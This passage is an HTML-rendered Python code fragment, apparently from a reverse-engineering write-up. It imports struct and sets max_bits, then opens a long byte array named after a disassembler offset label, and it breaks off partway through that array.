class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">max_bits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">off_560CC63C7150 = [<span class="number">0x6E</span>, <span class="number">0x4D</span>, <span class="number">0x1A</span>, <span class="number">0xC0</span>, <span class="number">0x36</span>, <span class="number">0x66</span>, <span class="number">0xCB</span>, <span class="number">0xA4</span>, <span class="number">0xA1</span>, <span class="number">0x5B</span>, <span class="number">0x0F</span>, <span class="number">0x5B</span>, <span class="number">0x26</span>, <span class="number">0x69</span>, <span class="number">0x26</span>, <span class="number">0x2B</span>, <span class="number">0x8F</span>, <span class="number">0xCB</span>, <span class="number">0x75</span>, <span class="number">0xEF</span>, <span class="number">0x2A</span>, <span class="number">0x22</span>, <span class="number">0x37</span>, <span class="number">0xA0</span>, <span class="number">0x9A</span>, <span class="number">0x61</span>, <span class="number">0x69</span>, <span class="number">0xBA</span>, <span class="number">0x32</span>, <span class="number">0x89</span>, <span class="number">0x79</span>, <span class="number">0x60</span>, <span class="number">0x59</span>, <span class="number">0xA8</span>, <span class="number">0x6E</span>, <span class="number">0x02</span>, <span class="number">0x93</span>, <span class="number">0x58</span>, <span class="number">0x31</span>, <span class="number">0xF1</span>, <span class="number">0xA6</span>, <span class="number">0x33</span>, <span class="number">0x59</span>, <span class="number">0x8B</span>, <span class="number">0x67</span>, <span class="number">0xAC</span>, <span class="number">0x2B</span>, <span class="number">0xE7</span>, <span class="number">0x04</span>, <span class="number">0x89</span>, <span class="number">0xCC</span>, <span class="number">0x1A</span>, <span class="number">0xEF</span>, <span class="number">0xD1</span>, <span class="number">0x48</span>, <span class="number">0x2E</span>, <span class="number">0xAB</span>, <span class="number">0xD5</span>, <span class="number">0x21</span>, <span class="number">0x3F</span>, <span class="number">0x1F</span>, <span class="number">0x5A</span>, <span class="number">0x33</span>, <span class="number">0x69</span>, <span class="number">0xF0</span>, <span class="number">0x68</span>, <span class="number">0x83</span>, <span class="number">0xBE</span>, <span class="number">0xC3</span>, <span class="number">0x84</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0x90</span>, <span class="number">0x49</span>, <span class="number">0x20</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0xA1</span>, <span class="number">0xCE</span>, <span class="number">0x18</span>, <span class="number">0x57</span>, <span class="number">0x91</span>, <span class="number">0x96</span>, <span class="number">0x33</span>, <span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0xEB</span>, <span class="number">0x21</span>, <span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0x7A</span>, <span class="number">0xFA</span>, <span class="number">0x6C</span>, <span class="number">0xBE</span>, <span class="number">0xE6</span>, <span class="number">0xAB</span>, <span class="number">0x7E</span>, <span class="number">0x61</span>, <span class="number">0x4E</span>, <span class="number">0x51</span>, <span class="number">0xC2</span>, <span class="number">0x3F</span>, <span class="number">0x77</span>, <span class="number">0xEC</span>, <span class="number">0x6A</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0xC6</span>, <span class="number">0xA4</span>, <span class="number">0xF7</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x01</span>, <span class="number">0xB3</span>, <span class="number">0xDC</span>, <span class="number">0x75</span>, <span class="number">0x7A</span>, <span class="number">0x8C</span>, <span class="number">0xE1</span>, <span class="number">0xAE</span>, <span class="number">0x69</span>, <span class="number">0x26</span>, <span class="number">0xF2</span>, <span class="number">0x24</span>, <span class="number">0x5F</span>, <span class="number">0x35</span>, <span class="number">0xDB</span>, <span class="number">0x9A</span>, <span class="number">0x23</span>, <span class="number">0xE1</span>, <span class="number">0x4E</span>, <span class="number">0x77</span>, <span class="number">0xA0</span>, <span class="number">0x34</span>, <span class="number">0xF4</span>, <span class="number">0xC8</span>, <span class="number">0xEF</span>, <span class="number">0x97</span>, <span class="number">0x7E</span>, <span class="number">0xF4</span>, <span class="number">0xF7</span>, <span class="number">0x7D</span>, <span class="number">0x79</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x6A</span>, <span class="number">0xE4</span>, <span class="number">0xF6</span>, <span class="number">0xD5</span>, <span class="number">0x80</span>, <span class="number">0xB7</span>, <span class="number">0x05</span>, <span class="number">0x40</span>, <span class="number">0xBF</span>, <span class="number">0xE1</span>, <span class="number">0xE3</span>, <span class="number">0x32</span>, <span class="number">0x75</span>, <span class="number">0xDD</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0xE7</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0x17</span>, <span class="number">0xFC</span>, <span class="number">0x43</span>, <span class="number">0x43</span>, <span class="number">0x71</span>, <span class="number">0x37</span>, <span class="number">0xBB</span>, <span class="number">0xBB</span>, <span class="number">0x85</span>, <span class="number">0xFE</span>, <span class="number">0x08</span>, <span class="number">0x08</span>, <span class="number">0xD3</span>, <span class="number">0x09</span>, <span class="number">0xD4</span>, <span class="number">0xD4</span>, <span class="number">0xFB</span>, <span class="number">0x2B</span>, <span class="number">0xE2</span>, <span class="number">0xE2</span>, <span class="number">0x1E</span>, <span class="number">0xAD</span>, <span class="number">0xA2</span>, <span class="number">0xA2</span>, <span class="number">0xB2</span>, <span class="number">0x2A</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0xF4</span>, <span class="number">0xC9</span>, <span class="number">0xB3</span>, <span class="number">0xB3</span>, <span class="number">0x3C</span>, <span class="number">0x33</span>, <span class="number">0x2D</span>, <span class="number">0x2D</span>, <span class="number">0xD0</span>, <span class="number">0xE4</span>, <span class="number">0x8C</span>, <span class="number">0x8C</span>, <span class="number">0x02</span>, <span class="number">0xB6</span>, <span class="number">0xB7</span>, <span class="number">0xB7</span>, <span class="number">0x59</span>, <span class="number">0x15</span>, <span class="number">0x8D</span>, <span class="number">0x8D</span>, <span class="number">0x8D</span>, <span class="number">0xF4</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0x5D</span>, <span class="number">0x10</span>, <span class="number">0x8A</span>, <span class="number">0x8A</span>, <span class="number">0x75</span>, <span class="number">0x32</span>, <span class="number">0xBC</span>, <span class="number">0xBC</span>, <span class="number">0xCB</span>, <span class="number">0x17</span>, <span class="number">0xC6</span>, <span class="number">0xC6</span>, <span class="number">0xC7</span>, <span class="number">0x18</span>, <span class="number">0xCF</span>, <span class="number">0xCF</span>, <span class="number">0x3E</span>, <span class="number">0x85</span>, <span class="number">0x9A</span>, <span class="number">0x9A</span>, <span class="number">0x9B</span>, <span class="number">0x53</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0x1F</span>, <span class="number">0xF6</span>, <span class="number">0x4D</span>, <span class="number">0x4D</span>, <span class="number">0x7E</span>, <span class="number">0xD5</span>, <span class="number">0xEA</span>, <span class="number">0xEA</span>, <span class="number">0x60</span>, <span class="number">0x78</span>, <span class="number">0x48</span>, <span class="number">0x48</span>, <span class="number">0x80</span>, <span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0xE0</span>, <span class="number">0xCE</span>, <span class="number">0x49</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x24</span>, <span class="number">0x2D</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0xB4</span>, <span class="number">0x99</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0x95</span>, <span class="number">0xEA</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x94</span>, <span class="number">0xB1</span>, <span class="number">0xFB</span>, <span class="number">0xFB</span>, <span class="number">0x3F</span>, <span class="number">0xDE</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x1D</span>, <span class="number">0x40</span>, <span class="number">0xFA</span>, <span class="number">0xFA</span>, <span class="number">0x05</span>, <span class="number">0x5E</span>, <span class="number">0xE8</span>, <span class="number">0xE8</span>, <span class="number">0x4E</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0xCE</span>, <span class="number">0x47</span>, <span class="number">0xB8</span>, <span class="number">0x2F</span>, <span class="number">0x2F</span>, <span class="number">0x4F</span>, <span class="number">0xB2</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x07</span>, <span class="number">0xE8</span>, <span class="number">0x5F</span>, <span class="number">0x5F</span>, <span class="number">0xB6</span>, <span class="number">0x2F</span>, <span class="number">0x74</span>, <span class="number">0x74</span>, <span class="number">0x39</span>, <span class="number">0x6D</span>, <span class="number">0xC5</span>, <span class="number">0xC5</span>, <span class="number">0x2D</span>, <span class="number">0x7C</span>, <span class="number">0xDE</span>, <span class="number">0xDE</span>, <span class="number">0x1B</span>, <span class="number">0xF3</span>, <span class="number">0x4A</span>, <span class="number">0x4A</span>, <span class="number">0x8C</span>, <span class="number">0xAF</span>, <span class="number">0xE9</span>, <span class="number">0xE9</span>, <span class="number">0x79</span>, <span class="number">0x3D</span>, <span class="number">0xB5</span>, <span class="number">0xB5</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x8F</span>, <span class="number">0x42</span>, <span class="number">0xB1</span>, <span class="number">0xB1</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x9F</span>, <span class="number">0x56</span>, <span class="number">0xAD</span>, <span class="number">0xAD</span>, <span class="number">0x86</span>, <span class="number">0x13</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x9A</span>, <span class="number">0x08</span>, <span class="number">0x45</span>, <span class="number">0x45</span>, <span class="number">0x98</span>, <span class="number">0xBE</span>, <span class="number">0xF2</span>, <span class="number">0xF2</span>, <span class="number">0xBC</span>, <span class="number">0x93</span>, <span class="number">0xCD</span>, <span class="number">0xCD</span>, <span class="number">0x54</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x6B</span>, <span class="number">0xC3</span>, <span class="number">0x1D</span>, <span class="number">0xC8</span>, <span class="number">0xC8</span>, <span class="number">0x4D</span>, <span class="number">0x04</span>, <span class="number">0x96</span>, <span class="number">0x96</span>, <span class="number">0xAE</span>, <span class="number">0x31</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x83</span>, <span class="number">0x4D</span>, <span class="number">0xB8</span>, <span class="number">0xB8</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x13</span>, <span class="number">0x13</span>, <span class="number">0x3D</span>, <span class="number">0x68</span>, <span class="number">0xC2</span>, <span class="number">0xC2</span>, <span class="number">0xBB</span>, <span class="number">0x7B</span>, <span class="number">0x92</span>, <span class="number">0x92</span>, <span class="number">0xCA</span>, <span class="number">0x4C</span>, <span class="number">0x29</span>, <span class="number">0x29</span>, <span class="number">0xE4</span>, <span class="number">0xDD</span>, <span class="number">0xAF</span>, <span class="number">0xAF</span>, <span class="number">0x0E</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xBE</span>, <span class="number">0xA9</span>, <span class="number">0xD9</span>, <span class="number">0x39</span>, <span class="number">0x39</span>, <span class="number">0xD2</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0x3B</span>, <span class="number">0xB9</span>, <span class="number">0xCD</span>, <span class="number">0x25</span>, <span class="number">0x25</span>, <span class="number">0xE3</span>, <span class="number">0x35</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0x64</span>, <span class="number">0x7D</span>, <span class="number">0x4F</span>, <span class="number">0x4F</span>, <span class="number">0x38</span>, <span class="number">0x36</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x19</span>, <span class="number">0x45</span>, <span class="number">0xFD</span>, <span class="number">0xFD</span>, <span class="number">0x3A</span>, <span class="number">0x80</span>, <span class="number">0x9D</span>, <span class="number">0x9D</span>, <span class="number">0xAC</span>, <span class="number">0x87</span>, <span class="number">0xD1</span>, <span class="number">0xD1</span>, <span class="number">0xD7</span>, <span class="number">0x0C</span>, <span class="number">0xD3</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>, <span class="number">0xE1</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0x47</span>, <span class="number">0xB6</span>, <span class="number">0xB6</span>, <span class="number">0x7B</span>, <span class="number">0x8B</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0xF9</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x41</span>, <span class="number">0x0B</span>, <span class="number">0x9F</span>, <span class="number">0x9F</span>, <span class="number">0x09</span>, <span class="number">0x51</span>, <span class="number">0xE1</span>, <span class="number">0xE1</span>, <span class="number">0x6C</span>, <span class="number">0x77</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x44</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x2C</span>, <span class="number">0x27</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x6B</span>, <span class="number">0x9F</span>, <span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">0x14</span>, <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x1B</span>, <span class="number">0x45</span>, <span class="number">0x0E</span>, <span class="number">0x98</span>, <span class="number">0x98</span>, <span class="number">0xF5</span>, <span class="number">0x92</span>, <span class="number">0x5C</span>, <span class="number">0x5C</span>, <span class="number">0x34</span>, <span class="number">0x39</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x7A</span>, <span class="number">0xD0</span>, <span class="number">0xED</span>, <span class="number">0xED</span>, <span class="number">0xEE</span>, <span class="number">0x61</span>, <span class="number">0x16</span>, <span class="number">0x16</span>, <span class="number">0x90</span>, <span class="number">0xB4</span>, <span class="number">0xFC</span>, <span class="number">0xFC</span>, <span class="number">0xDC</span>, <span class="number">0xEB</span>, <span class="number">0x85</span>, <span class="number">0x85</span>, <span class="number">0xF3</span>, <span class="number">0x21</span>, <span class="number">0xEC</span>, <span class="number">0xEC</span>, <span class="number">0xAB</span>, <span class="number">0x6F</span>, <span class="number">0x8E</span>, <span class="number">0x8E</span>, <span class="number">0xB1</span>, <span class="number">0xC7</span>, <span class="number">0x2B</span>, <span class="number">0x2B</span>, <span class="number">0xED</span>, <span class="number">0x8C</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x77</span>, <span class="number">0x84</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xC4</span>, <span class="number">0xF5</span>, <span class="number">0x97</span>, <span class="number">0x97</span>, <span class="number">0x03</span>, <span class="number">0xED</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0xDE</span>, <span class="number">0x5D</span>, <span class="number">0x32</span>, <span class="number">0x32</span>, <span class="number">0xE1</span>, <span class="number">0x83</span>, <span class="number">0x47</span>, <span class="number">0x47</span>, <span class="number">0x89</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x6D</span>, <span class="number">0x2C</span>, <span class="number">0xAE</span>, <span class="number">0xAE</span>, <span class="number">0x76</span>, <span class="number">0xDF</span>, <span class="number">0xE4</span>, <span class="number">0xE4</span>, <span class="number">0x48</span>, <span class="number">0x5A</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0x91</span>, <span class="number">0x91</span>, <span class="number">0xE7</span>, <span class="number">0x30</span>, <span class="number">0xF7</span>, <span class="number">0xF7</span>, <span class="number">0xC5</span>, <span class="number">0xAE</span>, <span class="number">0x78</span>, <span class="number">0x78</span>, <span class="number">0xCC</span>, <span class="number">0xFF</span>, <span class="number">0x99</span>, <span class="number">0x99</span>, <span class="number">0xD9</span>, <span class="number">0xB5</span>, <span class="number">0x6D</span>, <span class="number">0x6D</span>, <span class="number">0x1A</span>, <span class="number">0xA8</span>, <span class="number">0xA5</span>, <span class="number">0xA5</span>, <span class="number">0x55</span>, <span class="number">0x1A</span>, <span class="number">0x84</span>, <span class="number">0x84</span>, <span class="number">0xA8</span>, <span class="number">0x82</span>, <span class="number">0xD6</span>, <span class="number">0xD6</span>, <span class="number">0x6E</span>, <span class="number">0xC1</span>, <span class="number">0xF6</span>, <span class="number">0xF6</span>, <span class="number">0xAA</span>, <span class="number">0x34</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x81</span>, <span class="number">0x0C</span>, <span class="number">0x0C</span>, <span class="number">0x37</span>, <span class="number">0xD4</span>, <span class="number">0x7B</span>, <span class="number">0x7B</span>, <span class="number">0x53</span>, <span class="number">0xA9</span>, <span class="number">0x34</span>, <span class="number">0x34</span>, <span class="number">0xF1</span>, <span class="number">0x97</span>, <span class="number">0x5B</span>, <span class="number">0x5B</span>, <span class="number">0x96</span>, <span class="number">0x07</span>, <span class="number">0x4C</span>, <span class="number">0x4C</span>, <span class="number">0xDF</span>, <span class="number">0x06</span>, <span class="number">0xDD</span>, <span class="number">0xDD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x9A</span>, <span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0x33</span>, <span class="number">0xD1</span>, <span class="number">0x7C</span>, <span class="number">0x7C</span>, <span class="number">0x32</span>, <span class="number">0x8A</span>, <span class="number">0x93</span>, <span class="number">0x93</span>, <span class="number">0x16</span>, <span class="number">0xA7</span>, <span class="number">0xAC</span>, <span class="number">0xAC</span>, <span class="number">0x81</span>, <span class="number">0xFB</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x9C</span>, <span class="number">0xBB</span>, <span class="number">0xF5</span>, <span class="number">0xF5</span>, <span class="number">0xC1</span>, <span class="number">0xAB</span>, <span class="number">0x7F</span>, <span class="number">0x7F</span>, <span class="number">0x5F</span>, <span class="number">0xA6</span>, <span class="number">0x3D</span>, <span class="number">0x3D</span>, <span class="number">0xE6</span>, <span class="number">0x6B</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x30</span>, <span class="number">0x3C</span>, <span class="number">0x24</span>, <span class="number">0x24</span>, <span class="number">0xF8</span>, <span class="number">0xC6</span>, <span class="number">0xBA</span>, <span class="number">0xBA</span>, <span class="number">0xE9</span>, <span class="number">0x89</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0xBF</span>, <span class="number">0x7E</span>, <span class="number">0x95</span>, <span class="number">0x95</span>, <span class="number">0x58</span>, <span class="number">0x4E</span>, <span class="number">0x62</span>, <span class="number">0x62</span>, <span class="number">0xBD</span>, <span class="number">0xC8</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x5B</span>, <span class="number">0xA3</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0xF0</span>, <span class="number">0xCC</span>, <span class="number">0xB4</span>, <span class="number">0xB4</span>, <span class="number">0x5E</span>, <span class="number">0xFD</span>, <span class="number">0xD2</span>, <span class="number">0xD2</span>, <span class="number">0x01</span>, <span class="number">0x5B</span>, <span class="number">0xEF</span>, <span class="number">0xEF</span>, <span class="number">0x22</span>, <span class="number">0x9E</span>, <span class="number">0x8F</span>, <span class="number">0x8F</span>, <span class="number">0xA4</span>, <span class="number">0x8D</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>, <span class="number">0x97</span>, <span class="number">0x5C</span>, <span class="number">0xA3</span>, <span class="number">0xA3</span>, <span class="number">0xA7</span>, <span class="number">0x60</span>, <span class="number">0x87</span>, <span class="number">0x87</span>, <span class="number">0x99</span>, <span class="number">0xE5</span>, <span class="number">0x1D</span>, <span class="number">0x1D</span>, <span class="number">0xB7</span>, <span class="number">0x74</span>, <span class="number">0x9B</span>, <span class="number">0x9B</span>, <span class="number">0xAF</span>, <span class="number">0x6A</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x78</span>, <span class="number">0x66</span>, <span class="number">0x5A</span>, <span class="number">0x5A</span>, <span class="number">0x29</span>, <span class="number">0x79</span>, <span class="number">0xD9</span>, <span class="number">0xD9</span>, <span class="number">0xEC</span>, <span class="number">0xD7</span>, <span class="number">0xA1</span>, <span class="number">0xA1</span>, <span class="number">0xEA</span>, <span class="number">0x64</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0xE2</span>, <span class="number">0x6E</span>, <span class="number">0x1F</span>, <span class="number">0x1F</span>, <span class="number">0x62</span>, <span class="number">0xCE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC8</span>, <span class="number">0xFA</span>, <span class="number">0x9E</span>, <span class="number">0x9E</span>, <span class="number">0xE5</span>, <span class="number">0x86</span>, <span class="number">0x40</span>, <span class="number">0x40</span>, <span class="number">0x56</span>, <span class="number">0xF7</span>, <span class="number">0xDC</span>, <span class="number">0xDC</span>, <span class="number">0x4B</span>, <span class="number">0xB7</span>, <span class="number">0x26</span>, <span class="number">0x26</span>, <span class="number">0xF9</span>, <span class="number">0x9D</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x15</span>, <span class="number">0x15</span>, <span class="number">0x61</span>, <span class="number">0x23</span>, <span class="number">0xA7</span>, <span class="number">0xA7</span>, <span class="number">0x7C</span>, <span class="number">0x63</span>, <span class="number">0x5D</span>, <span class="number">0x5D</span>, <span class="number">0xCF</span>, <span class="number">0x12</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xC0</span>, <span class="number">0xF0</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x4A</span>, <span class="number">0xEC</span>, <span class="number">0xC9</span>, <span class="number">0xC9</span>, <span class="number">0xFD</span>, <span class="number">0x98</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x65</span>, <span class="number">0x26</span>, <span class="number">0xA0</span>, <span class="number">0xA0</span>, <span class="number">0x35</span>, <span class="number">0x62</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xB5</span>, <span class="number">0xC2</span>, <span class="number">0x2C</span>, <span class="number">0x2C</span>, <span class="number">0x2A</span>, <span class="number">0x94</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0xEB</span>, <span class="number">0x3F</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x28</span>, <span class="number">0x28</span>, <span class="number">0x20</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="number">0x67</span>, <span class="number">0x90</span>, <span class="number">0x17</span>, <span class="number">0x17</span>, <span class="number">0x8A</span>, <span class="number">0x1C</span>, <span class="number">0x59</span>, <span class="number">0x59</span>, <span class="number">0xF6</span>, <span class="number">0x7F</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x42</span>, <span class="number">0xE6</span>, <span class="number">0xC7</span>, <span class="number">0xC7</span>, <span class="number">0x0D</span>, <span class="number">0x54</span>, <span class="number">0xE6</span>, <span class="number">0xE6</span>, <span class="number">0x63</span>, <span class="number">0x95</span>, <span class="number">0x10</span>, <span class="number">0x10</span>, <span class="number">0x72</span>, <span class="number">0xDA</span>, <span class="number">0xE3</span>, <span class="number">0xE3</span>, <span class="number">0xCD</span>, <span class="number">0xA4</span>, <span class="number">0x76</span>, <span class="number">0x76</span>, <span class="number">0xD6</span>, <span class="number">0x57</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x0A</span>, <span class="number">0xBC</span>, 